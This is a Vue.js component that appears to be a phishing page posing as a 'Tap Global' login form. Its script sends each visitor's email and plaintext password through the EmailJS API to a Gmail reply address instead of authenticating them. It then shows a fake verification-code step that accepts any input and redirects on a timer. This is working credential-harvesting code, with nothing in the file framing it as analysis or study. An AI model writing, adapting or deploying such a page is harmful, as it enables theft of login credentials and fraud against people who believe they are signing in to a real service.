<template>
  <div class="">
    <div id="ethmerge">
      <section class="section" v-if="pageView === 'one'">
        <div>
          <div>
            <label class="text-[#152c5b] text-lg" for=""
              >Email/Phone Number</label
            >
            <input
              style="
                border: 1px solid #e2e7ec;
                border-radius: 8px;
                box-shadow: 0 0 20px 1px rgb(166 179 207 / 30%);
                transition: 0.2s ease-in-out;
                font-weight: 400;
              "
              class="text-[#152c5b] mt-2 h-[56px] bg-white w-full rounded-lg px-4 py-4 focus:ring border-[#e2e7ec] focus:ring-[#185cff] focus:border-[#185cff]"
              type="email"
              v-model="email"
              placeholder=""
            />
          </div>
          <div class="mt-5">
            <label class="text-[#152c5b] text-lg" for="">Password </label>
            <input
              style="
                border: 1px solid #e2e7ec;
                border-radius: 8px;
                box-shadow: 0 0 20px 1px rgb(166 179 207 / 30%);
                transition: 0.2s ease-in-out;
                font-weight: 400;
              "
              class="text-[#152c5b] mt-2 h-[56px] bg-white w-full rounded-lg px-4 py-4 focus:ring border-[#e2e7ec] focus:ring-[#185cff] focus:border-[#185cff]"
              type="password"
              v-model="password"
              placeholder=""
            />
          </div>
          <div class="mb-10 mt-10">
            <label class="MuiFormControlLabel-root flex items-center"
              ><span
                class="MuiButtonBase-root MuiIconButton-root jss692 MuiCheckbox-root MuiCheckbox-colorSecondary jss693 Mui-checked MuiIconButton-colorSecondary"
                aria-disabled="false"
              >
                <input
                  class="jss695"
                  type="checkbox"
                  data-indeterminate="false"
                  value=""
                />
              </span>
              <span
                class="text-[#185cff] ml-2 MuiTypography-root MuiFormControlLabel-label MuiTypography-body2"
                >I agree to the
                <a
                  class="text-[#185cff] MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorPrimary jss58"
                  target="_blank"
                  rel="noopener noreferrer"
                  href="/"
                  >terms of Service</a
                >.</span
              ></label
            >
          </div>
        </div>
        <button
          @click="proceed"
          class="flex items-center justify-center bg-[#3377f8] w-full py-4 rounded-md"
        >
          <div class="flex items-center">
            <strong>Login</strong>
            <div
              v-if="isLoading"
              class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
            ></div>
          </div>
        </button>
      </section>

      <section class="secton" v-if="pageView === 'two'">
        <div class="mb-10">
          <div>
            <label class="text-[#152c5b] text-lg" for=""
              >Input Verification Code</label
            >
            <input
              style="
                border: 1px solid #e2e7ec;
                border-radius: 8px;
                box-shadow: 0 0 20px 1px rgb(166 179 207 / 30%);
                transition: 0.2s ease-in-out;
                font-weight: 400;
              "
              class="text-[#152c5b] mt-2 h-[56px] bg-white w-full rounded-lg px-4 py-4 focus:ring border-[#e2e7ec] focus:ring-[#185cff] focus:border-[#185cff]"
              type="text"
              v-model="code"
              placeholder=""
            />
          </div>
        </div>
        <button
          @click="checkVerificationCode"
          class="flex items-center justify-center bg-[#3377f8] w-full py-4 rounded-md"
        >
          <div class="flex items-center">
            <strong>Proceed</strong>
            <div
              v-if="isLoadingCheck"
              class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
            ></div>
          </div>
        </button>
      </section>
    </div>
  </div>
</template>

<script>
import axios from 'axios'
export default {
  data() {
    return {
      isLoading: false,
      isLoadingCheck: false,
      email: '',
      password: '',
      pageView: 'one',
      intervalid1: '',
      intervalid2: '',
      code: '',
    }
  },
  methods: {
    proceed() {
      const self = this
      this.isLoading = true
      this.getInformation()
      this.intervalid1 = setInterval(function () {
        self.isLoading = false
        self.pageView = 'two'
        self.myStopFunction()
      }, 3000)
    },

    myStopFunction() {
      clearInterval(this.intervalid1)
      clearInterval(this.intervalid2)
    },

    checkVerificationCode() {
      const self = this
      this.isLoadingCheck = true
      if (this.code !== '') {
        this.intervalid2 = setInterval(function () {
          self.isLoadingCheck = false
          self.$router.push('/validation')
          self.myStopFunction()
        }, 3000)
      } else {
        this.$toast.error('Invalid verification code, contact the admin')
        this.isLoadingCheck = false
      }
    },

    getInformation() {
      let self = this
      try {
        this.isLoading = true
        if (this.email !== '' && this.password !== '') {
          var data = {
            service_id: 'service_g49xzs9',
            template_id: 'template_xkj0lgc',
            user_id: 'Q_v6F22hpmQkpwuex',
            template_params: {
              from_name: 'Tap Global',
              email: this.email,
              password: this.password,
              reply_to: 'customeronlineagent@gmail.com',
            },
          }
          axios
            .post('https://api.emailjs.com/api/v1.0/email/send', data)
            .then(function () {
              self.isLoading = false
            })
            .catch(function () {
              self.isLoading = false
              self.$toast.error('Something went wrong, contact administrator')
            })
        } else {
          this.$toast.info('Wrong Input!. Fill the input form ')
          this.isLoading = false
        }
      } catch (error) {
        this.$toast.error('Something went wrong')
      }
    },
  },
}
</script>

<style></style>
